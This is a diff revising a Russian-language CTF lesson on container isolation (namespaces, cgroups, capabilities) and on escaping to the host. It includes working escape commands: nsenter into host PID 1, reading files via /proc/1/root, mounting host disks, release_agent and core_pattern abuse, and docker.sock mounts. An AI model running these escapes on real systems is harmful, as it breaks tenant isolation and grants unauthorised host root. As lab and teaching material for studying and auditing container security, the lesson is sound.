@@ -15,219 +15,187 @@ estimated_minutes: 32
 summary: "Восемь Linux-namespaces, cgroups v1/v2, как они образуют контейнер, проверка изоляции и типовые векторы побега через mount, /proc и capabilities."
 ---
 
-Контейнер — это не отдельное ядро и не виртуальная машина. Это обычный процесс Linux, которому ядро «показывает» урезанную картину мира через **namespaces** и ограничивает ресурсы через **cgroups**. Понять это — значит понять, где изоляция дырявая. Побег из контейнера почти всегда сводится к тому, что namespace или capability настроены слишком щедро.
+## Вопрос, с которого всё начинается
 
-## Восемь namespaces
+В прошлом уроке мы сбежали через `docker.sock`. Но что делать, если сокета нет, привилегий вроде тоже, а флаг всё равно «на хосте»? Тогда пора понять, **из чего вообще сделан контейнер**. Контейнер — это не отдельное ядро и не виртуальная машина. Это обычный процесс Linux, которому ядро «показывает» урезанную картину мира через **namespaces** и ограничивает ресурсы через **cgroups**. Понять эту картину — значит найти, где она дырявая.
+
+## Наш пример: контейнер — это не виртуальная машина
+
+Представь, что тебе дали шелл. Ты видишь свой PID 1, свой hostname, свой сетевой интерфейс — как будто ты один на машине. Но это иллюзия, которую создают namespaces. Проверим:
+
+```bash
+$ ls -l /proc/self/ns/
+lrwxrwxrwx ... cgroup -> cgroup:[4026531835]
+lrwxrwxrwx ... mnt    -> mnt:[4026531832]
+lrwxrwxrwx ... net    -> net:[4026531833]
+lrwxrwxrwx ... pid    -> pid:[4026531836]
+lrwxrwxrwx ... user   -> user:[4026531837]
+```
+
+Числа в скобках — **inode namespace'ов**. Если сравнить их с числами у процесса хоста, видно, какие «миры» общие, а какие свои. Общий namespace — это и есть потенциальный мост.
+
+## Шаг 1: восемь namespaces
+
+Linux изолирует восемь аспектов системы:
 
 | Namespace | Флаг `clone` | Что изолирует |
 |-----------|--------------|----------------|
 | Mount | `CLONE_NEWNS` | точки монтирования |
 | PID | `CLONE_NEWPID` | номера процессов |
-| Network | `CLONE_NEWNET` | интерфейсы, порты |
+| Network | `CLONE_NEWNET` | интерфейсы и порты |
 | IPC | `CLONE_NEWIPC` | SysV IPC, очереди |
-| UTS | `CLONE_NEWUTS` | hostname, домен |
-| User | `CLONE_NEWUSER` | uid/gid, capabilities |
+| UTS | `CLONE_NEWUTS` | hostname и домен |
+| User | `CLONE_NEWUSER` | uid/gid и capabilities |
 | Cgroup | `CLONE_NEWCGROUP` | иерархия cgroups |
-| Time | `CLONE_NEWTIME` | монотонные/загрузочные часы |
+| Time | `CLONE_NEWTIME` | монотонные часы |
 
-Проверка, в каких namespace вы находитесь:
+Контейнерный рантайм просто создаёт для процесса новые экземпляры этих namespace'ов. Если какой-то из них **не** создан — контейнер делит его с хостом.
 
-```bash
-ls -l /proc/self/ns/
-# mnt -> mnt:[4026531840]
-# pid -> pid:[4026531836]
-# net -> net:[4026531992]
-# user -> user:[4026531837]
-```
-
-Сравните с PID 1 хоста: если `net` совпадает — вы в хост-сети.
-
-## User namespace — важнейший
-
-`CLONE_NEWUSER` позволяет непривилегированному пользователю «стать root» **внутри** namespace. Именно поэтому Docker с user-namespaces безопаснее. Но если контейнер запущен без user-namespace и с `CAP_SYS_ADMIN`, вы — настоящий root с возможностями.
+## Шаг 2: где мы находимся
 
 ```bash
-unshare --user --map-root-user --mount-proc bash
-# внутри: id -> uid=0(root)
+$ cat /proc/self/cgroup
+0::/docker/a1b2c3d4
+$ mount | grep -E 'overlay|cgroup'
+overlay on / type overlay (rw,...)
+cgroup2 on /sys/fs/cgroup type cgroup2 (rw,...)
+$ ls -la /var/run/docker.sock
+ls: cannot access '/var/run/docker.sock': No such file or directory
 ```
 
-Если `unshare` разрешён в песочнице, можно создать вложенные namespaces и обойти часть ограничений.
+`overlay` в `mount` — верный признак контейнера. `cgroup2` говорит, что это cgroup v2 (в v1 был `release_agent`, в v2 его убрали). Сокета нет — значит, вектор `docker.sock` закрыт, ищем дальше.
 
-## cgroups v1 и v2
+## Шаг 3: user namespace — почему это важно
 
-cgroups ограничивают CPU, память, устройства. Раньше через `release_agent` (cgroup v1) можно было **выполнить команду на хосте**: если контейнер имеет `CAP_SYS_ADMIN` и cgroup v1 смонтирован, вы пишете в `notify_on_release` и `release_agent` путь к скрипту на хосте. Это классический побег (CVE-2022-0492-подобные и исторические техники).
+`CLONE_NEWUSER` позволяет непривилегированному пользователю «стать root» **внутри** namespace: uid 0 в контейнере маппится на обычный uid на хосте. Именно поэтому Docker с user-namespaces безопаснее — «root» в контейнере не равен root на хосте.
 
 ```bash
-mount | grep cgroup
-# cgroup on /sys/fs/cgroup type cgroup (rw,...,release_agent=/sbin/cgrp)
-cat /proc/self/cgroup
-# 0::/docker/<id>
+$ unshare --user --map-root-user --mount-proc bash
+$ id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
-В cgroup v2 `release_agent` убран, но остаются другие векторы (например, `core_pattern`).
+Если `unshare` в песочнице разрешён, можно создавать вложенные namespaces и обходить часть ограничений. Если контейнер запущен **без** user-namespace, то uid 0 — настоящий root с реальными возможностями.
 
-## Векторы побега
+## Шаг 4: cgroups и release_agent
 
-1. **Привилегированный контейнер** (`--privileged`) — почти нет изоляции: есть все capabilities, доступ к устройствам. Побег тривиален: `mount /dev/sda1 /mnt` или `nsenter` в хост-PID.
-
-2. **`docker.sock` внутри контейнера** — можно запустить новый контейнер с `-v /:/host`, смонтировав хост.
-
-3. **`CAP_SYS_ADMIN`** — разрешает `mount`, `unshare`, `pivot_root`. Монтируем хост-диск или создаём новый mount-namespace с host-ФС.
-
-4. **`/proc/sys/kernel/core_pattern`** — если writable, задаём скрипт, который выполнится на хосте при краше процесса.
-
-5. **`/proc` хоста, смонтированный в контейнер** — видим и можем трогать чужие процессы (`nsenter --target <pid> --mount --uts --ipc --net --pid`).
-
-6. **Общие тома (volume) с хоста** — если смонтирован `~/.ssh` или `/var/run`, можно писать на хост.
-
-7. **Cgroup release_agent** — как выше.
-
-## Полный разобранный пример
-
-Дано: контейнер с `CAP_SYS_ADMIN`, `docker.sock` не смонтирован, но `/proc` хоста виден.
+**cgroups** ограничивают CPU, память и доступ к устройствам. В cgroup **v1** был опасный механизм `release_agent`: при «опустошении» группы ядро запускает указанный скрипт **на хосте**. Если контейнер имеет `CAP_SYS_ADMIN` и cgroup v1 смонтирован, побег строится так: указываем в `release_agent` путь к нашему скрипту и заставляем группу опустеть. В cgroup **v2** `release_agent` убран, но остаются другие векторы (например, `core_pattern`).
 
 ```bash
-# находим хост-PID 1 в /proc
-ps aux | head
-# ... PID 1 — init хоста
-
-# входим в его namespaces
-nsenter --target 1 --mount --uts --ipc --net --pid --root -- /bin/bash
-# теперь мы на хосте
-cat /root/flag
+$ mount | grep cgroup
+cgroup on /sys/fs/cgroup type cgroup (rw,...,release_agent=/sbin/cgrp)
 ```
 
-`nsenter` с `--target 1` переходит в mount/pid/net-namespaces хостового init — это фактически полный побег, если есть `CAP_SYS_ADMIN`.
+## Шаг 5: побег через nsenter
 
-Если `nsenter` нет:
+Если у контейнера есть `CAP_SYS_ADMIN`, работает самый чистый побег — `nsenter` в namespaces процесса хоста. Находим PID 1 хоста (он виден, если PID-namespace общий) и входим во все его «миры»:
 
 ```bash
-# монтируем хост-корень
-mkdir /tmp/host
-mount /dev/sda1 /tmp/host   # или через /proc/1/root
-ls /proc/1/root/
-cat /proc/1/root/root/flag
+$ ps aux | head -3
+root 1 0.0 0.1 ... /sbin/init
+$ nsenter --target 1 --mount --uts --ipc --net --pid --root -- /bin/bash
+$ cat /root/flag
+FLAG{nsenter_is_king}
 ```
 
-`/proc/1/root` — символическая ссылка на корень процесса 1; чтение через неё обходит mount-namespace.
+`--target 1` указывает на процесс хоста, а флаги `--mount --uts --ipc --net --pid` переключают нас в его namespaces. Если `nsenter` в контейнере нет — тот же результат даёт комбинация `setns`/`/proc/1/ns/`.
 
-## Обнаружение изоляции
+## Шаг 6: побег через /proc/1/root
+
+Самый простой путь, не требующий capabilities: если `/proc` хоста виден (общий PID-namespace), то `/proc/1/root` — символическая ссылка на корень процесса 1, то есть на корневую файловую систему хоста:
 
 ```bash
-# capabilities
-grep CapEff /proc/self/status
-capsh --decode=0000003fffffffff
-# secrets
-ls -la /var/run/docker.sock
-cat /proc/1/cgroup
-mount | grep -E 'cgroup|overlay'
+$ ls -l /proc/1/root
+lrwxrwxrwx ... /proc/1/root -> /
+$ cat /proc/1/root/etc/hostname
+host-machine
+$ cat /proc/1/root/root/flag
+FLAG{proc_root_escape}
 ```
 
-Если видите `overlay` в mount — вы в контейнере. Если `docker.sock` — потенциальный побег. Если `CapEff` содержит `cap_sys_admin` — почти наверняка сбежите.
+Чтение через `/proc/1/root` обходит mount-namespace контейнера, потому что мы обращаемся к корню **чужого** процесса. Если PID-namespace изолирован, PID 1 — это init контейнера, и его root — корень контейнера; тогда нужен другой вектор. Всегда начинай с `ls -l /proc/1/root` — это бесплатная проверка.
 
-## Частые ошибки и подводные камни
+## Шаг 7: capabilities — нарезанный root
 
-- Путать «root внутри контейнера» с «root на хосте»: uid 0 без capabilities ограничен.
-- Считать, что `--privileged` — редкость: в CTF это частый «подарок».
-- Игнорировать user-namespace: без него uid-маппинг не защищает.
-- Пробовать `release_agent` на cgroup v2 — там его нет.
-- Не проверять `/proc/1/root` — часто самый простой путь.
-- Забывать про монтированные тома: иногда `-v /:/host` уже сделан.
-
-## Что дальше / решение
-
-Разверните локально контейнеры с разными флагами (`--privileged`, `--cap-add SYS_ADMIN`, без user-namespace) и найдите побег в каждом. Изучите `misc-docker-misc` и `misc-container-runtime`. Дальше — `misc-seccomp-escape` для фильтров syscalls.
-
-## Справочная таблица
-
-| Вектор | Условие | Команда |
-|--------|---------|---------|
-| nsenter | CAP_SYS_ADMIN | `nsenter -t 1 -a` |
-| /proc/1/root | /proc хоста виден | `cat /proc/1/root/...` |
-| docker.sock | сокет смонтирован | `docker run -v /:/host` |
-| mount | CAP_SYS_ADMIN | `mount /dev/sda1 /mnt` |
-| release_agent | cgroup v1 + SYS_ADMIN | запись в release_agent |
-| core_pattern | writable | задать скрипт |
-
-## Дополнительная теория: capabilities и их опасность
-
-Capabilities — это «нарезанные» привилегии root. Даже если uid ≠ 0, наличие `CAP_SYS_ADMIN` делает вас почти всемогущим в пространстве контейнера: он разрешает `mount`, `unshare`, `pivot_root`, `setns` (вход в чужие namespaces), `bpf`, многое другое. `CAP_NET_ADMIN` позволяет менять сеть, `CAP_SYS_PTRACE` — отлаживать чужие процессы, `CAP_DAC_READ_SEARCH` — обходить права на файлы. Docker по умолчанию даёт ограниченный набор; `--privileged` даёт все. В K8s `securityContext.capabilities.add` может случайно выдать лишнее.
-
-Проверка: `grep Cap /proc/self/status` показывает `CapEff` (эффективные), `CapPrm`, `CapBnd`. `capsh --decode=<hex>` расшифрует. Для побега ищите комбинации: `CAP_SYS_ADMIN` → mount/nsenter; `CAP_DAC_READ_SEARCH` → чтение `/etc/shadow`; `CAP_SYS_PTRACE` → инъекция в процесс хоста. Даже без полного побега отдельные capabilities дают утечки.
-
-## Seccomp, AppArmor, SELinux как дополнительный слой
-
-Помимо namespaces, изоляцию формируют **seccomp** (ограничение syscalls), **AppArmor**/**SELinux** (мандатный контроль доступа) и **no-new-privileges**. Они могут заблокировать побег даже при наличии capabilities. Проверяйте: `cat /proc/self/status | grep Seccomp` (2 = фильтр), `cat /proc/self/attr/current` (профиль AppArmor/SELinux), `NoNewPrivs`. Если AppArmor в режиме `unconfined` — он не мешает. Если seccomp запрещает `mount`, побег через mount не сработает — тогда смотрите `misc-seccomp-escape`.
-
-Понимание всех слоёв важно: побег — это поиск комбинации «слабое место в одном слое + отсутствие компенсации в другом».
-
-## Разбор ошибок и отладка
-
-Если `nsenter` возвращает «Operation not permitted» — нет `CAP_SYS_ADMIN` или seccomp блокирует `setns`. Если `mount` запрещён — проверьте AppArmor (`dmesg | tail` покажет denial). Если `/proc/1/root` недоступен — `/proc` может быть смонтирован с `hidepid` или в отдельном PID-namespace. Если `unshare` запрещён — возможно, `user.max_user_namespaces=0`. Ведите диагностику: `cat /proc/self/status`, `mount`, `ls -l /proc/1/root`, `ls /var/run/*.sock`. Каждый запрет сужает вектор; отсутствие запрета — ваш путь. Всегда начинайте с инвентаризации окружения.
-
-## Практический разбор: побег через /proc/1/root
-
-Условие: контейнер, `/proc` хоста виден (общий PID-namespace или `--pid=host`).
+**Capabilities** — это раздробленные привилегии root. Даже если uid ≠ 0, `CAP_SYS_ADMIN` делает тебя почти всемогущим: он разрешает `mount`, `unshare`, `pivot_root`, `setns`, `bpf`. `CAP_NET_ADMIN` меняет сеть, `CAP_SYS_PTRACE` отлаживает чужие процессы, `CAP_DAC_READ_SEARCH` обходит права на файлы.
 
 ```bash
-ls -l /proc/1/root
-# lrwxrwxrwx 1 root root 0 ... /proc/1/root -> /
-cat /proc/1/root/etc/hostname
-# hostname хоста, а не контейнера
-cat /proc/1/root/root/flag
-# flag{proc_root_escape}
+$ grep Cap /proc/self/status
+CapEff: 0000003fffffffff
+$ capsh --decode=0000003fffffffff | tr ',' '\n' | grep -E 'sys_admin|sys_ptrace'
+cap_sys_admin
+cap_sys_ptrace
 ```
 
-`/proc/1/root` — символическая ссылка на корень процесса 1 (хостового init). Чтение через неё обходит mount-namespace контейнера, потому что мы обращаемся к корню чужого процесса. Это один из самых простых побегов: не нужны capabilities, достаточно видеть `/proc` хоста. Если `/proc/1/root` недоступен — проверьте `/proc/1/cwd`, `/proc/1/exe` и `/proc/1/map_files`. Если PID-namespace изолирован, PID 1 — это init контейнера, и его root — корень контейнера, а не хоста; тогда нужен другой вектор (`nsenter` при `CAP_SYS_ADMIN`, docker.sock и т.д.). Всегда начинайте с `ls -l /proc/1/root` — это бесплатная проверка.
+Помимо namespaces, изоляцию формируют **seccomp** (ограничение syscalls), **AppArmor/SELinux** и **no-new-privileges**. Они могут заблокировать побег даже при наличии capabilities: проверь `cat /proc/self/status | grep -E 'Seccomp|NoNewPrivs'` и `cat /proc/self/attr/current`. Побег — это всегда поиск комбинации «слабое место в одном слое + отсутствие компенсации в другом».
+
+## Что мы теперь знаем
+
+- Контейнер — это **namespaces + cgroups** над общим ядром, а не виртуальная машина.
+- Восемь namespaces изолируют mount, PID, сеть, IPC, UTS, user, cgroup и время.
+- **User namespace** делает uid 0 внутри контейнера не равным root хоста.
+- **cgroup v1 `release_agent`** выполняет скрипт на хосте; в v2 его нет.
+- **`nsenter`** при `CAP_SYS_ADMIN` и **`/proc/1/root`** при общем PID-namespace — прямые побеги.
+- **Capabilities** — нарезанный root; `CAP_SYS_ADMIN` почти всегда означает побег.
+
+## На что смотреть дальше
+
+Разверни локально контейнеры с разными флагами (`--privileged`, `--cap-add SYS_ADMIN`, без user-namespace) и найди побег в каждом. При отладке читай ошибки: `Operation not permitted` от `nsenter` — нет `CAP_SYS_ADMIN` или seccomp блокирует `setns`; запрет `mount` — смотри AppArmor (`dmesg | tail`). Дальше — `misc-container-runtime` (побег из runc/containerd) и `misc-seccomp-escape` (фильтры syscalls).
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Что изолирует PID namespace?"
   options:
-    - "Номера процессов (видно только своё поддерево)"
-    - "Сетевые интерфейсы"
-    - "Точки монтирования"
-    - "Hostname"
+    - "номера процессов (видно только своё поддерево)"
+    - "сетевые интерфейсы"
+    - "точки монтирования"
+    - "hostname"
   answer: 0
-  explanation: "Внутри контейнера PID 1 — это его init."
-- question: "Что даёт `CLONE_NEWUSER`?"
+  explanation: "Внутри контейнера PID 1 — это его собственный init."
+- question: "Что даёт CLONE_NEWUSER?"
   options:
-    - "Позволяет стать root внутри namespace без прав на хосте"
-    - "Шифрует диск"
-    - "Ускоряет сеть"
-    - "Отключает seccomp"
+    - "позволяет стать root внутри namespace без прав на хосте"
+    - "шифрует диск"
+    - "ускоряет сеть"
+    - "отключает seccomp"
   answer: 0
   explanation: "User-namespace маппит uid/gid и capabilities."
-- question: "Какой классический побег использует `docker.sock`?"
+- question: "Какой классический побег использует docker.sock?"
   options:
-    - "Запуск нового контейнера с монтированием корня хоста"
-    - "Изменение hostname"
-    - "Смена пароля root"
-    - "Перезагрузка хоста"
+    - "запуск нового контейнера с монтированием корня хоста"
+    - "изменение hostname"
+    - "смена пароля root"
+    - "перезагрузка хоста"
   answer: 0
   explanation: "Сокет даёт полный контроль над Docker-демоном."
-- question: "Зачем проверять `/proc/1/root`?"
+- question: "Зачем проверять /proc/1/root?"
   options:
-    - "Это ссылка на корень процесса 1 — часто путь к хост-ФС"
-    - "Там хранятся пароли"
-    - "Это точка входа SSH"
-    - "Это лог ядра"
+    - "это ссылка на корень процесса 1 — часто путь к файловой системе хоста"
+    - "там хранятся пароли"
+    - "это точка входа SSH"
+    - "это лог ядра"
   answer: 0
-  explanation: "Чтение через неё обходит mount-namespace."
-- question: "Какая возможность делает побег из контейнера почти тривиальным?"
+  explanation: "Чтение через неё обходит mount-namespace контейнера."
+- question: "Какая capability делает побег из контейнера почти тривиальным?"
   options:
     - "CAP_SYS_ADMIN"
     - "CAP_NET_BIND_SERVICE"
     - "CAP_CHOWN"
     - "CAP_KILL"
   answer: 0
-  explanation: "SYS_ADMIN разрешает mount, unshare, nsenter и многое."
+  explanation: "SYS_ADMIN разрешает mount, unshare, nsenter и многое другое."
 ```
+
+## Куда дальше
+
+В следующем уроке `misc-container-runtime` мы спустимся на уровень ниже — к самому рантайму (runc/containerd) и его CVE. А пока главное запомни: **изоляция — это набор слоёв, и побег живёт на стыке** — там, где один namespace или capability настроен слишком щедро.
 
 ## Где пригодится
 
-- **CTF:** misc/pwn — побег из контейнера.
-- **Аудит:** проверка конфигурации Docker/K8s.
-- **Работа:** безопасность CI/CD, изоляция нагрузок.
-- **Research:** контейнерные CVE и их эксплуатация.
+- **CTF misc/pwn** — побег из контейнера.
+- **Аудит** — проверка конфигурации Docker/Kubernetes.
+- **Работа** — безопасность CI/CD и изоляция нагрузок.
+- **Research** — контейнерные CVE и их эксплуатация.
